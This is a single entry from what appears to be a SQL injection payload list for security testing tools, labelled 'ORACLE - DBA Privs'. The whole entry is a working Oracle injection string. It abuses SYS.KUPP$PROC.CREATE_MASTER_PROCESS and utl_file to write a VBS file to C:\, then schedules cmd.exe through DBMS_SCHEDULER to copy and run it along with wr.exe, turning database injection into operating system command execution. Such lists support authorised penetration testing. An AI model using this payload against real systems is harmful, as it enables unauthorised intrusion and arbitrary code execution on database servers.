payload.name: ORACLE - DBA Privs
payload.attack: (SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('BEGIN EXECUTE IMMEDIATE ''create or replace procedure pr(p in varchar2,fn in varchar2,l in nvarchar2) is o_f utl_file.file_type; begin o_f:=utl_file.fopen(p,fn,''''W'''',4000);utl_file.put_line(o_f,l);utl_file.fclose(o_f);end;'';execute immediate ''create or replace directory T as ''''C:\'''''';pr(''T'',''x.vbs'',''{PAYLOAD}'');DBMS_SCHEDULER.create_program(''bb'', ''EXECUTABLE'', ''c:\WINDOWS\system32\cmd.exe /c copy C:\x.vbs %TEMP% /y&&%TEMP%\x.vbs&&%TEMP%\wr.exe'',0,TRUE);DBMS_SCHEDULER.create_job(''au'',''bb'',enabled=>TRUE);END;') from dual) is not null--
